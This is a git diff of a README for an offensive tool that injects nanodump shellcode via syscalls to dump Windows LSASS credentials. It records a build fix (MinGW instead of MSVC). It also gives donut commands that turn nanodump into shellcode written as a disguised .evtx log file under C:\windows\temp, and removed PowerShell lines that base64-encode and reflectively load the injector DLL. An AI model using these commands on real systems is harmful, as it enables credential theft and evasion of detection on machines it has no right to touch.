@@ -23,24 +23,19 @@ Added syscalls for the `Inject()` function. Small project to practice syscalls u
 
 - Learn what this PatchExit function is, and replace with syscalls as well? 
 
-- Using most up-to-date 06/12/2022 nanodump + donut doesn't work - the powershell process will crash upon `NtCreateThreadEx`. Need to find the correct commit for both nanodump + donut, `git reset --hard <hash>`, and retry creating donut'ed nanodump. 
+- ~~Using most up-to-date 06/12/2022 nanodump + donut doesn't work - the powershell process will crash upon `NtCreateThreadEx`. Need to find the correct commit for both nanodump + donut, `git reset --hard <hash>`, and retry creating donut'ed nanodump.~~
+
+- Mystery solved, use Linux & MinGW for compiling and using donut + nanodump. Don't use Window's MSVC. The nanodump shellcode with up-to-date nanodump & donut works now!
 
 ## Things for myself 
 ```
-# donut 
-donut.exe -i <path>\nanodump.x64.exe -b=1 -t -p "--write C:\windows\temp\trash2.evtx" -o C:\nanodump.bin
+# DONT USE WINDOW'S MSVC to compile donut & nanodump 
 
-# Copy/Paste base64'ed nanodump 
-[Convert]::ToBase64String([IO.File]::ReadAllBytes("c:\nanodump.bin")) | clip
+# use *nix instead!
+make -f Makefile.mingw
 
-# Debugging  
-
-$base64binary = [convert]::tobase64string((get-content -path "<path>\sNanoDumpInject\bin\Release\sNanoDumpInject.dll" -encoding byte ))
-$RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
-[sNanoDumpInject.Program]::Inject(1) <# change 1 or 2 depending on nanodump shellcode #>
-
-# Copy/Paste base64'ed sNanoDumpInject to the original powershell 
-[Convert]::ToBase64String([IO.File]::ReadAllBytes("<path>\sNanoDumpInject\bin\Release\sNaNoDumpInject.dll")) | clip
+./donut -i /opt/nanodump/dist/nanodump.x64.exe -b=1 -t -p "--valid --write C:\windows\temp\appevtlog.evtx" -o nano.bin -f 2; cat nano.bin | xclip -sel p
+./donut -i /opt/nanodump/dist/nanodump.x64.exe -b=1 -t -p "--valid --write C:\windows\temp\appevtlog.evtx" -o nano.bin -f 2; cat nano.bin | xclip -sel c
 
 # Reflective Loader by S3cur3th1ssh1t
 function Invoke-NanoDump
